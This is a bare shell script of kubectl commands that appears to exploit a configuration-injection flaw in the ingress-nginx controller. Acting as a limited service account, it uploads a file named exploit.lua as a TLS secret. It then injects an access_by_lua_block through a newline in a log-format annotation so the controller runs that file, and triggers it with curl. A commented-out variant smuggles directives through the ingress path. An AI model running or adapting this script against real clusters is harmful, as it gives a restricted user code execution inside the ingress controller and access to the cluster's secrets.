kubectl delete secret lua-payload-secret -n app --as=system:serviceaccount:app:limited-user || true

kubectl create secret generic lua-payload-secret \
-n app \
--as=system:serviceaccount:app:limited-user \
--from-file=ca.crt=exploit.lua \
--from-file=tls.crt=exploit.lua \
--from-file=tls.key=exploit.lua


kubectl annotate ingress auth-app-two-ingress -n app \
  nginx.ingress.kubernetes.io/auth-tls-secret="lua-payload-secret" \
  --overwrite \
  --as=system:serviceaccount:app:limited-user


# kubectl patch ingress auth-app-two-ingress -n app \
#   --type=json \
#   -p='[
#     {
#       "op": "replace",
#       "path": "/spec/rules/0/http/paths/0/path",
#       "value": "/app2-test(/|$)(.*)\nlua_package_path \"/etc/ingress-controller/ssl/app-lua-payload-secret.pem;;\";"
#     }
#   ]' \
#   --as=system:serviceaccount:app:limited-user


kubectl annotate ingress auth-app-two-ingress -n app \
  nginx.ingress.kubernetes.io/log-format-upstream="escape=json '{\"\$time_local\": \"\$time_local\"}';\n  access_by_lua_block { dofile('/etc/ingress-controller/ssl/app-lua-payload-secret.pem') }" \
  --overwrite \
  --as=system:serviceaccount:app:limited-user

kubectl get ingress auth-app-two-ingress -n app \
    -o yaml | grep -A15 annotations

curl -k "http://10.110.162.206/app2"

# kubectl get validatingadmissionpolicy limited-user-only-ingress-annotations-and-path -o yaml